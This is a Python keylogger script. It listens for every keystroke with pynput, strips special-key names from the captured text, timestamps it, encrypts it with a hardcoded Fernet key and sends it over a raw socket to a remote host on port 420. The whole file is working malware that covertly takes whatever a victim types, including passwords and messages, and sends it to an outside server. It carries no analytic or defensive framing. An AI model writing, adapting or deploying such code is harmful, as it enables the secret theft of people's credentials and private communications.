import socket, datetime
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet


LOGGER_HOST = "xn--6pw65a019d.xyz"
LOGGER_PORT = 420
enc_key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
logger = socket.socket()
logger.connect((LOGGER_HOST, LOGGER_PORT))  
wordz = str()    
def press(key):
    global wordz
    wordz += str(key)
    if key == Key.space or key == Key.enter:
        contents = f"\n{wordz}\n"
        contents = contents.replace("'", "")
        contents = contents.replace("Key.space", "")
        contents = contents.replace("Key.backspace", "")
        contents = contents.replace("Key.shift", "")
        contents = contents.replace("Key.alt", "")
        contents = contents.replace("Key.enter", "")
        contents = contents.replace("Key.alt_gr", "")
        contents = contents.replace("Key.alt_l", "")
        contents = contents.replace("Key.alt_r", "")
        contents = contents.replace("Key.caps_lock", "")
        contents = contents.replace("Key.cmd", "")
        contents = contents.replace("Key.cmd_l", "")
        contents = contents.replace("Key.cmd_r", "")
        contents = contents.replace("Key.ctrl", "")
        contents = contents.replace("Key.ctrl_l", "")
        contents = contents.replace("Key.ctrl_r", "")
        contents = contents.replace("Key.delete", "")
        contents = contents.replace("Key.down", "")
        contents = contents.replace("Key.end", "")
        contents = contents.replace("Key.esc", "")
        contents = contents.replace("Key.f1", "")
        contents = contents.replace("Key.f2", "")
        contents = contents.replace("Key.f3", "")
        contents = contents.replace("Key.f4", "")
        contents = contents.replace("Key.f5", "")
        contents = contents.replace("Key.f6", "")
        contents = contents.replace("Key.f7", "")
        contents = contents.replace("Key.f8", "")
        contents = contents.replace("Key.f9", "")
        contents = contents.replace("Key.f10", "")
        contents = contents.replace("Key.f11", "")
        contents = contents.replace("Key.f12", "")
        contents = contents.replace("Key.f13", "")
        contents = contents.replace("Key.f14", "")
        contents = contents.replace("Key.f15", "")
        contents = contents.replace("Key.f16", "")
        contents = contents.replace("Key.f17", "")
        contents = contents.replace("Key.f18", "")
        contents = contents.replace("Key.f19", "")
        contents = contents.replace("Key.f20", "")
        contents = contents.replace("Key.home", "")
        contents = contents.replace("Key.insert", "")
        contents = contents.replace("Key.left", "")
        contents = contents.replace("Key.menu", "")
        contents = contents.replace("Key.num_lock", "")
        contents = contents.replace("Key.page_down", "")
        contents = contents.replace("Key.page_up", "")
        contents = contents.replace("Key.pause", "")
        contents = contents.replace("Key.print_screen", "")
        contents = contents.replace("Key.scroll_lock", "")
        contents = contents.replace("Key.right", "")
        contents = contents.replace("Key.shift_l", "")
        contents = contents.replace("Key.shift_r", "")
        contents = contents.replace("Key.tab", "")
        contents = contents.replace("Key.up", "")
        date_now = str(datetime.datetime.now())
        contents =  "\n" + date_now + contents
        logger.send(Fernet(enc_key).encrypt(contents.encode()))
        wordz = str()
while True:
    with Listener(
            on_press=press,) as listener:
        listener.join()